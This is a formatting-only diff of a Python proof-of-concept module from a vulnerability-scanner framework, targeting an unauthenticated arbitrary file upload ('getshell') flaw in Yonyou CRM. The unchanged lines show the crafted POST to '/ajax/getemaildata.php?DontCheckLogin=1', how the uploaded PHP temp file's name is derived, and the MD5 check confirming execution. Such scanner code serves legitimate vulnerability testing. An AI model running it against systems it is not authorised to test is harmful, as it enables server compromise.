@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0032' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0032'  # 平台漏洞编号，留空
     name = '用友CRM系统 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-08-31'  # 漏洞公布时间
     desc = '''
         用友CRM系统任意文件读取/任意文件上传getshell.
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'df6dcd41-0dd7-45fe-afb8-eceed01809dc'
@@ -32,12 +34,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0137503
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0137503
             hh = hackhttp.hackhttp()
             shellName = ""
             for i in range(16):
-                shellName += chr(ord('a') + random.randint(0,25))
+                shellName += chr(ord('a') + random.randint(0, 25))
             payload = "/ajax/getemaildata.php?DontCheckLogin=1"
             raw = """
 POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
@@ -69,18 +71,20 @@ upload
             reRes = re.findall("(\w+.tmp.mht)", res)
             if reRes:
                 x = re.search('mht(.*?)\.', reRes[0], re.I)
-                m = re.search('0x(.*)', hex(int(x.group(1),16)-1))
-                code, head, res, err, _ = hh.http(self.target + "/tmpfile/" + 'upd' + m.group(1) + '.tmp.php')
+                m = re.search('0x(.*)', hex(int(x.group(1), 16)-1))
+                code, head, res, err, _ = hh.http(
+                    self.target + "/tmpfile/" + 'upd' + m.group(1) + '.tmp.php')
                 if 'c4ca4238a0b923820dcc509a6f75849b' in res:
                     #security_hole(arg+payload+" ---> "+arg+"tmpfile/"+'upd'+m.group(1)+'.tmp.php'+" : file upload / get shell")
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))      
-                
+                        target=self.target, name=self.vuln.name))
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
